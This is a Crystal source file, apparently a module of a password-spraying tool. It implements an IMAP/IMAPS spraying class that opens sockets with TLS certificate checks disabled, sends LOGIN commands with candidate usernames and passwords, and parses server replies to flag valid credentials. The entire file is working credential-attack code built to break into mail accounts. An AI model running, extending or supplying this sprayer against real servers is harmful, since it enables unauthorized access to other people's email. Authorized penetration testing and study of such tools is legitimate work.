require "openssl"



class IMAP < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # # some basic setups for web based auth 
        url = URI.parse @target 
        # #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        if url.port.nil?
            url.port = 993 if url.scheme == "imaps"
            url.port = 143 if url.scheme == "imap"
        end

        if url.scheme && url.host
            if url.scheme == "imap"
                # puts "Using port #{url.port} for imap                "
                spstatus.valid_credentials = login_imap(username, password, url.host.not_nil!, url.port.not_nil!, ssl: false )
            elsif url.scheme == "imaps"
                # puts "Using port #{url.port} for imaps                "
                spstatus.valid_credentials = login_imap(username, password, url.host.not_nil!, url.port.not_nil!, ssl: true  )
            else
                raise "Invalid target scheme for imap (use imaps or imap)"
            end
        end 
        
        
        # return the SprayStatus object 
        return spstatus
    end

    def login_imap(username : String, password : String , host : String , port : Int32, ssl : Bool = false ) : Bool 

        # puts "logging into #{host}:#{port} in login_imap"
        
        # puts "Creating socket to #{host}:#{port}"
        socket = TCPSocket.new(host, port)
        if ssl 
            # puts "Creating SSL context"
            context = OpenSSL::SSL::Context::Client.new
            context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

            tls = OpenSSL::SSL::Socket::Client.new(socket, context: context )
            # puts "Setting socket to TLS mode"
            socket = tls
        end 
        
        # puts "Sending login command"
        command = "tag LOGIN #{username} #{password}"
        socket << command
        socket << "\r\n"
        # puts "Flushing socket"
        socket.flush
    
        # puts "Reading response"
        resp = Array(String).new
        while(i = socket.gets)
            if i =~ /^tag OK/
                resp << i
                break
            elsif i =~ /Authentication (disabled|disallowed)/i
                STDERR.puts "\n(#{username}, #{password} , #{host}) - Authentication disabled/disallowed Try Using SSL/TLS(IMAPS)"
                raise "Use change to tls or try not using tls"
            elsif i =~ /Invalid credentials/i
                # raise "Invalid Credentials"
                return false
            elsif i =~ /^tag NO/i
                STDERR.puts "\n(#{username}, #{password} , #{host}) - Command error: RESULT: #{i}"
                raise "Command error: RESULT: #{i}"
            elsif i =~ /^tag BAD/i
                STDERR.puts "\n(#{username}, #{password} , #{host}) - Unknown command or arguments invalid: #{i}\n".colorize(:red)
                raise "Unknown command or arguments invalid: #{i}"
            else
                resp << i
            end
        end
    
        if resp.join(" ") =~ /LOGIN completed/i
            return true 
        end 
        return false 
    end 

end